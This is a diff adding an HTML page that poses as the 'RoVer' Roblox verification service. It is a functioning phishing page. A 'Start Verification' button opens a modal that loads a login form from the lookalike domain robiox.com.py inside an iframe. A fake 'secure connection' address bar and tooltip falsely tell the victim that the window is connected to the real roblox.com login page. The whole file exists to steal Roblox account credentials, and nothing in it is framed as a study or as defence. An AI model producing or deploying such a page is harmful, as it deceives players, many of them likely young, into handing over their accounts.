@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Roblox Verification</title>
+
+  <!-- Favicon -->
+  <link rel="icon" href="image.png" type="image/png">
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #111111; color: #ffffff;
+      font-family: 'Roboto', sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    header {
+      background: #ff3399; padding: 12px 15px;
+      display: flex; align-items: center; justify-content: space-between;
+      font-size: 1rem; flex-wrap: wrap; gap: 10px;
+    }
+
+    .logo { font-weight: bold; font-size: 1.4rem; }
+    .menu { display: flex; gap: 12px; flex-wrap: wrap; font-size: 0.9rem; }
+    .menu a { color: white; text-decoration: none; }
+    .user-info { display: flex; align-items: center; gap: 8px; font-size: 0.9rem; }
+
+    main {
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      min-height: calc(100vh - 60px); text-align: center; padding: 15px;
+    }
+
+    .content { max-width: 600px; width: 100%; }
+
+    h1 { font-size: clamp(1.8rem, 7vw, 2.5rem); margin-bottom: 15px; }
+    p { color: #aaaaaa; margin-bottom: 30px; font-size: clamp(1rem, 4vw, 1.2rem); }
+
+    .buttons { display: flex; justify-content: center; gap: 12px; margin-bottom: 30px; flex-wrap: wrap; }
+
+    .btn-primary, .btn-secondary {
+      padding: 12px 35px; border-radius: 8px;
+      font-size: clamp(1rem, 4vw, 1.2rem);
+      cursor: pointer; transition: 0.2s;
+    }
+
+    .btn-primary { background: #ff3399; color: white; border: none; }
+    .btn-primary:hover { background: #ff5ab3; }
+    .btn-primary:active { transform: scale(1.05); }
+
+    .btn-secondary {
+      background: transparent;
+      color: #ff3399;
+      border: 1px solid #ff3399;
+    }
+
+    .extra-link { color: #ff3399; text-decoration: none; font-size: 1rem; }
+
+    .initial-content { display: block; }
+    .success-content {
+      display: none;
+      color: #00ff9d;
+      font-size: 2rem;
+      font-weight: 500;
+      text-align: center;
+    }
+
+    /* MODAL */
+    .modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.95);
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 10px;
+    }
+
+    .modal.open { display: flex; }
+
+    .modal-content {
+      width: 100%;
+      max-width: 900px;
+      height: 90vh;
+      background: #1e1e1e;
+      border-radius: 12px;
+      padding: 0;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 30px rgba(255,51,153,0.3);
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 2.5rem;
+      cursor: pointer;
+      z-index: 10;
+    }
+
+    /* DOMAIN BAR */
+    .domain-bar {
+      height: 44px;
+      display: flex;
+      align-items: center;
+      padding: 0 14px;
+      gap: 6px;
+      background: #0f0f0f;
+      border-bottom: 1px solid #333;
+      font-size: 0.95rem;
+      color: #ccc;
+      position: relative;
+    }
+
+    .domain-link {
+      color: #00ff9d;
+      font-weight: 500;
+      text-decoration: none;
+      cursor: help;
+      position: relative;
+    }
+
+    .domain-link::after {
+      content: "A janela abaixo estabelece uma conexão segura com “https://www.roblox.com/pt/Login”.";
+      white-space: pre-line;
+      position: absolute;
+      bottom: -12px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100%);
+      background: #1c1c1c;
+      color: #ddd;
+      padding: 10px 12px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      width: 300px;
+      box-shadow: 0 0 18px rgba(0,0,0,0.6);
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.2s ease, transform 0.2s ease;
+      z-index: 50;
+      border: 1px solid #333;
+    }
+
+    .domain-link::before {
+      content: "";
+      position: absolute;
+      bottom: -6px;
+      left: 50%;
+      transform: translateX(-50%);
+      border-width: 6px;
+      border-style: solid;
+      border-color: transparent transparent #1c1c1c transparent;
+      opacity: 0;
+      transition: opacity 0.2s ease;
+    }
+
+    .domain-link:hover::after,
+    .domain-link:hover::before {
+      opacity: 1;
+    }
+
+    .verification-container {
+      width: 100%;
+      height: calc(100% - 44px);
+      position: relative;
+      overflow: hidden;
+      background: #000;
+    }
+
+    .loading-screen {
+      position: absolute;
+      inset: 0;
+      background: #1e1e1e;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 5;
+      cursor: not-allowed;
+      font-size: 1.1rem;
+      color: #00ff9d;
+    }
+
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid rgba(255,255,255,0.2);
+      border-top-color: #ff3399;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      display: none;
+    }
+
+  </style>
+</head>
+
+<body>
+
+<header>
+  <div class="logo">RoVer</div>
+  <div class="menu">
+    <a href="#">Help</a>
+    <a href="#">Team Members</a>
+    <a href="#">Manage Servers</a>
+    <a href="#">Verification</a>
+  </div>
+  <div class="user-info">
+    <span>version: 1.39</span>
+  </div>
+</header>
+
+<main>
+  <div class="content">
+    <div class="initial-content" id="initial-content">
+      <h1>You are not verified yet</h1>
+      <p>To access exclusive features, complete the Roblox security verification.</p>
+      <div class="buttons">
+        <button class="btn-primary" id="start-verification">Start Verification</button>
+        <button class="btn-secondary">Cancel</button>
+      </div>
+      <a href="#" class="extra-link">Need help with verification? →</a>
+    </div>
+
+    <div class="success-content" id="success-content">
+      <h1>Verification completed!</h1>
+      <p>You now have full access to the server</p>
+    </div>
+  </div>
+</main>
+
+<div class="modal" id="verification-modal">
+  <div class="modal-content">
+    <button class="close-btn" id="close-modal">×</button>
+
+    <div class="domain-bar">
+      Conexão segura em
+      <span id="domain-text">.</span>
+    </div>
+
+    <div class="verification-container">
+      <div class="loading-screen" id="loading">
+        <div class="spinner"></div>
+        <div>Preparing verification...</div>
+      </div>
+
+      <iframe id="verify-iframe" src="about:blank"></iframe>
+    </div>
+  </div>
+</div>
+
+<script>
+  const IFRAME_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F245368165474%2Fprofile"; // replace with real URL
+
+  const modal = document.getElementById('verification-modal');
+  const initial = document.getElementById('initial-content');
+  const success = document.getElementById('success-content');
+  const startBtn = document.getElementById('start-verification');
+  const closeBtn = document.getElementById('close-modal');
+  const loading = document.getElementById('loading');
+  const iframe = document.getElementById('verify-iframe');
+  const domainText = document.getElementById('domain-text');
+
+  let domainInterval;
+
+  function startDomainLoading() {
+    let dots = 0;
+    domainInterval = setInterval(() => {
+      dots = (dots + 1) % 4;
+      domainText.textContent = '.'.repeat(dots);
+    }, 500);
+  }
+
+  function showDomainLink() {
+    clearInterval(domainInterval);
+    domainText.innerHTML = `<a class="domain-link" href="https://www.roblox.com/pt/Login" target="_blank">https://www.roblox.com/pt/Login</a>`;
+  }
+
+  function completeVerification() {
+    modal.classList.remove('open');
+    initial.style.display = 'none';
+    success.style.display = 'block';
+  }
+
+  startBtn.onclick = () => {
+    modal.classList.add('open');
+    loading.style.display = 'flex';
+    iframe.style.display = 'none';
+    iframe.src = IFRAME_URL;
+
+    startDomainLoading();
+
+    setTimeout(() => {
+      loading.style.display = 'none';
+      iframe.style.display = 'block';
+      showDomainLink();
+    }, 2600);
+  };
+
+  closeBtn.onclick = () => modal.classList.remove('open');
+</script>
+
+</body>
+</html>
